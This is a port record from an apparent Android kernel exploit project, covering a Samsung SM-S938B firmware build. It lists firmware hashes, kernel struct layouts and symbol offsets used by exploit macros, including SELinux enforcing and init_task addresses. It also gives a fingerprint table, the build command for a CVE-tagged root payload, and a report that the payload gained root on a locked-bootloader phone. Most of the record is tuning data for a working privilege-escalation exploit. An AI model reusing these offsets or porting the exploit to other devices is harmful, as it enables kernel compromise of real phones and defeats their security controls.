# SM-S938B / S938BXXSBCZG3 port record

Status: **COMPLETE — release payload built and hardware validated**

The exact profile is enabled in `support/targets-v2.json` after successful use
on the device represented by the profile.

## Exact identity

```text
manufacturer: samsung
model: SM-S938B
device: pa3q
hardware: qcom
ABI: arm64-v8a
SDK / Android: 36 / 16
page size: 4096
build display: BP4A.251205.006.S938BXXSBCZG3
build fingerprint: samsung/pa3qxxx/pa3q:16/BP4A.251205.006/S938BXXSBCZG3_OXMBCZG3:user/release-keys
bootloader: S938BXXSBCZG3
uname -r: 6.6.98-android15-8-pd6ff1cd-abogkiS938BXXSBCZG3-4k
uname -v: #1 SMP PREEMPT Thu Jul  2 00:48:56 UTC 2026
/proc/version: Linux version 6.6.98-android15-8-pd6ff1cd-abogkiS938BXXSBCZG3-4k (kleaf@build-host) (Android (11368308, +pgo, +bolt, +lto, +mlgo, based on r510928) clang version 18.0.0 (https://android.googlesource.com/toolchain/llvm-project 477610d4d0d988e69dbc3fae4fe86bff3f07f2b5), LLD 18.0.0) #1 SMP PREEMPT Thu Jul  2 00:48:56 UTC 2026
sched:sched_blocked_reason runtime event ID: 109
```

An inherited `pa3q-S938NKSUACZF1` profile was first used manually to confirm the
shared physical mapping and exploit path. That test loaded the Samsung-KDP
KernelSU module, but it was not used as the final support profile because the
firmware identity and one P0 fingerprint word differ. The enabled profile uses
the CZG3-specific table and exact feed identity below.

## Input provenance

| Compressed input | Size | SHA-256 |
| --- | ---: | --- |
| `boot.img.lz4` | 22,667,041 | `129eb9edc8e458a244ae44b56948eb2d883c4c5618fd51470d9fc7ef064ba207` |
| `vendor_boot.img.lz4` | 37,780,370 | `8bdc6e1ab96fc599f06e33b46e83ae554a0ebcaf4c180dfd868050b35b5246a4` |
| `abl.elf.lz4` | 806,692 | `1ab731171689178b2edf4ea70f958d3881f92d00e191e6bb627cf34fb5bc323f` |
| `xbl_s.melf.lz4` | 712,597 | `b170128d3dcbd271def2a3818a399e1a0d31e7bab8ca6a60ba495586d63d926b` |
| `xbl_config.elf.lz4` | 89,815 | `61844ba710c688a24bfb81188feb53bc220acdfa10dc0777996d97178765d6da` |
| `XblRamdump.elf.lz4` | 963,616 | `2cc11071d3de81299253636724b50484a9c042314b99382ee009943d5f77f9f0` |

| Decompressed image | Size | SHA-256 |
| --- | ---: | --- |
| `boot.img` | 101,122,048 | `4127f89e99c899ef23bf9b68ca9064d4943df836a503b75a6ae7468cd4956e70` |
| `vendor_boot.img` | 134,217,728 | `07930023cf58ca07dd0673aa52204799b24267337541b5990569835824ff6f34` |
| `abl.elf` | 2,470,200 | `584e0df2d075a3ea8e4be3dbaac745542305baa1262f308f5552af2d9a3d999b` |
| `xbl_s.melf` | 1,176,404 | `20c5048497494df4634b7bc57a01ba26f49951e37fc33eb49a9afbc0026cf1ab` |
| `xbl_config.elf` | 346,872 | `c0580266f25b1909cb1291b71c1b9ae0358b7e8616672befedfab00bc13adc0f` |
| `XblRamdump.elf` | 1,791,092 | `6e9e5d716f67f1d6d8c53f4cb1625d0b0d33332a99e42959d94761a02779926e` |

## Boot and vendor-boot extraction

`boot.img` is Android boot header v4 with 4096-byte alignment and no generic
ramdisk. The kernel starts at `0x1000` and is an uncompressed ARM64 Image.

```text
raw kernel size: 38,849,024 (0x250ca00)
raw kernel SHA-256: 61ad369a056cbc9c0f5700e050c9d8d2769f0c05537a606728725958c194d20b
text_offset: 0x0
advertised image_size: 0x27b0000
flags: 0xa
magic: ARMd
```

`vendor_boot.img` is header v4 with 4096-byte pages, a 35,661,561-byte vendor
ramdisk, an 8,486,851-byte DTB, two ramdisk-table entries, and a 233-byte
bootconfig. The platform and `recovery` legacy-LZ4 ramdisks both decompressed
successfully as CPIO archives.

## BTF recovery

Exactly one valid little-endian BTF blob was found:

```text
interval: [0x18748d4, 0x1e8bb88)
size: 6,386,356
SHA-256: c3a0fbfeff1410502ab4624c906908a8d176a763c8835d5dfaffe33a3ece3e36
type count: 146,830
```

Critical CZG3 layouts:

```text
sizeof(file_operations)=0x108; ioctl=0x48; compat_ioctl=0x50; mmap=0x58;
open=0x68; release=0x78; splice_read=0xb8; show_fdinfo=0xd8

task_struct: usage=0x40, prio=0x84, normal_prio=0x8c,
sched_task_group=0x348, pi_lock=0x90c, pi_waiters=0x920,
pi_top_task=0x930, pi_blocked_on=0x938

rt_mutex_waiter: size=0x70, tree=0x00, pi_tree=0x28,
task=0x50, lock=0x58, wake_state=0x60, ww_ctx=0x68

configfs_buffer: page=0x10, needs_read_fill=0x50, bin_buffer=0x58,
bin_buffer_size=0x60, cb_max_size=0x64

workqueue_struct.dfl_pwq=0xb0
pool_workqueue: pool=0x00, wq=0x08, work_color=0x10, refcnt=0x18,
nr_in_flight=0x1c, nr_active=0x5c, max_active=0x60
worker_pool: worklist=0x28, nr_idle=0x3c
work_struct: data=0x00, entry=0x08, func=0x18

struct page: size=0x40, compound_head=0x08, slab_cache=0x08, page_type=0x30
miscdevice.fops=0x10
```

These values equal the two checked-in PA3Q CZF1 layouts, but were derived
independently from the CZG3 BTF.

## Kallsyms and exploit offsets

114,228 symbols were decoded. The recovered relative base is
`0xffffffc080000000`.

```text
kallsyms_names:       0x1460298
kallsyms_markers:     0x15e9d98
kallsyms_token_table: 0x15ea498
kallsyms_token_index: 0x15ea820
kallsyms_offsets:     0x15eaa20
```

| Macro/use | CZG3 derivation | Offset |
| --- | --- | ---: |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | `call_usermodehelper_exec_work` | `0x000d0eac` |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF` | post-`schedule` PC in `worker_thread` | `0x000d97ec` |
| `NOOP_LLSEEK_OFF` | `noop_llseek` | `0x003c9450` |
| `COPY_SPLICE_READ_OFF` | `copy_splice_read` | `0x00416970` |
| `CONFIGFS_READ_ITER_OFF` | `configfs_read_iter` | `0x004954b8` |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | `configfs_bin_write_iter` | `0x004959e4` |
| `ASHMEM_IOCTL_OFF` | `ashmem_ioctl` | `0x00d70dfc` |
| `ASHMEM_COMPAT_IOCTL_OFF` | `compat_ashmem_ioctl` | `0x00d714b8` |
| `ASHMEM_MMAP_OFF` | `ashmem_mmap` | `0x00d7150c` |
| `ASHMEM_OPEN_OFF` | `ashmem_open` | `0x00d7172c` |
| `ASHMEM_RELEASE_OFF` | `ashmem_release` | `0x00d717b4` |
| `ASHMEM_SHOW_FDINFO_OFF` | `ashmem_show_fdinfo` | `0x00d71840` |
| `ANON_PIPE_BUF_OPS_OFF` | `anon_pipe_buf_ops` | `0x0124cdc8` |
| `ASHMEM_FOPS_OFF` | `ashmem_fops` | `0x0140b440` |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` | `nfnetlink_log` string | `0x0175e2a1` |
| `KMALLOC_CACHES_OFF` | `kmalloc_caches` | `0x017da710` |
| `SYSTEM_UNBOUND_WQ_OFF` | `system_unbound_wq` | `0x022fae60` |
| `SLIDE_NFULNL_LOGGER_OBJECT_OFF` | `nfulnl_logger` | `0x02302278` |
| `INIT_TASK_OFF` | `init_task` | `0x0230e4c0` |
| `ASHMEM_MISC_FOPS_OFF` | `ashmem_misc + 0x10` | `0x0247d7f0` |
| boot-ID data pointer | `random_table` slot | `0x02439490` |
| `ROOT_TASK_GROUP_OFF` | `root_task_group` | `0x0251cd80` |
| `SELINUX_ENFORCING_OFF` | first member of `selinux_state` | `0x0255f5c0` |
| `SLIDE_SYSCTL_BOOTID_OFF` | `sysctl_bootid` | `0x026426d8` |

Every numeric exploit offset equals the two CZF1 PA3Q targets. This is a direct
CZG3 result, not an inferred copy.

## Trace cross-check

```text
__start_ftrace_events:          0x022b1920
__event_sched_blocked_reason:   0x022b1be8
event index: (0x022b1be8 - 0x022b1920) / 8 = 89
__TRACE_LAST_TYPE: 20
offline event ID: 20 + 89 = 109
runtime event ID: 109
```

The exact offline/runtime agreement independently validates the recovered
symbol order.

## Physical mapping

The source target retains:

```c
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL
```

The Qualcomm ABL is an outer ELF containing a UEFI firmware volume, so the load
value is not exposed as a simple outer-ELF literal. The value was first
confirmed by the successful inherited S938N payload and then confirmed again by
the exact CZG3 payload completing on the same device.

## Firmware-specific P0 table

A fresh table was generated from the CZG3 Image for all 32 slides (`0x000000`
through `0x1f0000`, step `0x10000`) and all eight qwords per row (`0x000`
through `0xe00`, step `0x200`). All 256 qwords were read back from the source
Image.

```text
header: src/targets/pa3q-S938BXXSBCZG3/p0_fingerprint.h
size: 7,379
SHA-256: 0df8737f0260a35c0d2a65584c6150c0d8f56c39085107a777677da35b39c75e
```

The table is not fully interchangeable with CZF1. At slide `0x0c0000`, the
CZG3 row contains:

```text
0x913da821d000b321
```

while the S938N CZF1 table contains:

```text
0x913dc821d000b321
```

This single observed qword difference is sufficient to require the dedicated
header.

## Added target and artifact

```text
src/targets/pa3q-S938BXXSBCZG3/target.h
src/targets/pa3q-S938BXXSBCZG3/p0_fingerprint.h
artifacts/pa3q-S938BXXSBCZG3/cve-2026-43499-app.so
```

Both headers pass a standalone C11 syntax check. The release payload was built
with:

```sh
make TARGET=pa3q-S938BXXSBCZG3 ANDROID_NDK_HOME=/path/to/android-ndk-r29 release
```

The published app payload is 104,128 bytes, matching the size recorded in the
support feed.

## Hardware validation

The exact profile was tested on the locked-bootloader device identified above.
The application selected `pa3q-S938BXXSBCZG3`, acquired bootstrap root,
staged the Samsung-KDP KernelSU build and verified the KernelSU control channel.
A complete device reboot removed the temporary root as expected; rerunning the
same profile restored it.

The successful root session was subsequently used for the post-boot Zygisk
investigation. Zygisk Next worked without source changes after a KernelSU
Manager Soft Reboot. A dedicated NeoZygisk post-boot fork also reached a stable
state after moving its live runtime to `/dev/.neozygisk`, attaching a
same-generation monitor after the exploit, and waiting for a user-initiated
KernelSU Manager Soft Reboot. Those provider changes are separate from this
payload contribution and do not alter the exploit or KernelSU payload.
